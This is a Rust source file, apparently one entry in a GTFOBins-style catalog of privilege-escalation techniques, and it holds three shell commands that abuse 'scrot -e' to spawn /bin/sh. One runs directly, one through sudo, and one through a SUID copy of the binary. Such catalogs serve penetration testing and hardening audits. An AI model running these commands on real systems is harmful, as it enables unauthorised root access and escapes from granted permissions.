pub static BIN_NAME: &'static str = "scrot";
pub static SH_CODE: &'static str = r#"
    
    scrot -e /bin/sh
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo scrot -e /bin/sh
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which scrot) .

    ./scrot -e /bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
